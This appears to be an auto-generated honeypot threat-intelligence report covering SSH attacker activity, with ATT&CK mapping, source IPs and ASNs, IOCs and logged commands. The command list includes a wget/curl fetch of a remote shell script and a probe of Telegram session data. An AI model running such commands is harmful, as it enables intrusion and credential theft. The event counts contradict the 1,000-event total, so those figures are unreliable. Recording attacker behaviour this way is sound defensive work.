# Threat Intelligence Report

**Generated**: 2026-04-21 03:49 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **1,000 events** from **556 unique source IPs** across **33 countries** and **48 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 1,000 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 556 |
| Atomic Attack Patterns | 1005 |
| MITRE ATT&CK Techniques | 6 |
| Generated Sigma Rules | 4 |
| Generated YARA Rules | 3 |
| Generated Suricata Rules | 5 |
| Blocked IPs (Firewall) | 498 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1082 (System Information Discovery) | | 993 |
| T1059.004 (Unix Shell) | | 2 |
| T1105 (Ingress Tool Transfer) | | 2 |
| T1005 (Data from Local System) | | 2 |
| T1016 (System Network Configuration Discovery) | | 1 |
| T1057 (Process Discovery) | | 1 |

### Tactics Distribution

- **discovery**: 995 events ████████████████████████████████████████
- **execution**: 2 events █
- **command_and_control**: 2 events █
- **collection**: 2 events █

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| France | 5,911 |
| United States | 5,468 |
| Mexico | 5,270 |
| Germany | 2,445 |
| Poland | 2,378 |
| Netherlands | 2,202 |
| United Kingdom | 816 |
| Russia | 809 |
| Bulgaria | 488 |
| Singapore | 444 |
| China | 429 |
| South Korea | 409 |
| Pakistan | 318 |
| Hong Kong | 297 |
| Seychelles | 296 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| Sierra Madre Internet SA de CV | 5,080 |
| OVH SAS | 3,688 |
| ISAEV Igor | 2,341 |
| Modat B.V. | 1,714 |
| Hydra Communications Ltd | 1,576 |
| Pfcloud UG (haftungsbeschrankt) | 1,447 |
| Amazon.com, Inc. | 1,172 |
| Tube-Hosting | 1,008 |
| ONYPHE SAS | 983 |
| Google LLC | 847 |
| DigitalOcean, LLC | 841 |
| Censys, Inc. | 739 |
| Alibaba US Technology Co., Ltd. | 735 |
| UCLOUD INFORMATION TECHNOLOGY HK LIMITED | 611 |
| Proton66 OOO | 497 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `177.125.137.18` | 5,080 | Attacker |
| `51.68.207.118` | 3,685 | Attacker |
| `87.251.64.159` | 2,329 | Attacker |
| `45.156.87.99` | 1,370 | Attacker |
| `185.91.127.85` | 1,008 | Attacker |
| `176.120.22.6` | 497 | Attacker |
| `85.11.167.11` | 395 | Attacker |
| `220.92.117.221` | 380 | Attacker |
| `85.217.140.37` | 272 | Attacker |
| `152.42.238.0` | 253 | Attacker |
| `104.243.35.92` | 247 | Attacker |
| `160.119.76.49` | 229 | Attacker |
| `45.205.1.5` | 210 | Attacker |
| `200.124.160.2` | 188 | Attacker |
| `167.172.175.156` | 169 | Attacker |
| `45.205.1.110` | 169 | Attacker |
| `85.217.140.43` | 158 | Attacker |
| `85.217.140.11` | 152 | Attacker |
| `18.116.101.220` | 150 | Attacker |
| `3.129.187.38` | 142 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 556 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 5 |

### Targeted File Paths

- `/.local/share/TelegramDesktop/tdata`
- `/etc/smsd.conf`
- `/var/log/smsd.log`
- `/var/qmux_connect`
- `/var/spool/sms`

### Extracted URLs

- `https://46.151.182.82/sh`

---

## Top Attack Patterns (SSH)

- [465x] `uname -m`
- [457x] `uname -s -v -n -r -m`
- [56x] `uname -a`
- [13x] `/bin/./uname -s -v -n -r -m`
- [2x] `grep '[Mm]iner`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://46.151.182.82/sh`
- [1x] `curl -sk https://46.151.182.82/sh`
- [1x] `sh -s ssh`
- [1x] `ifconfig`
- [1x] `cat /proc/cpuinfo`
- [1x] `ps -ef`
- [1x] `ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* `
- [1x] `locate D877F783D5D3EF8Cs`
- [1x] `echo Hi`

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 4 | `sigma/*.yml` |
| YARA (Payload) | 3 | `yara/*.yar` |
| Suricata (IDS/IPS) | 5 | `suricata/honeypot.rules` |
| Firewall (iptables) | 498 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*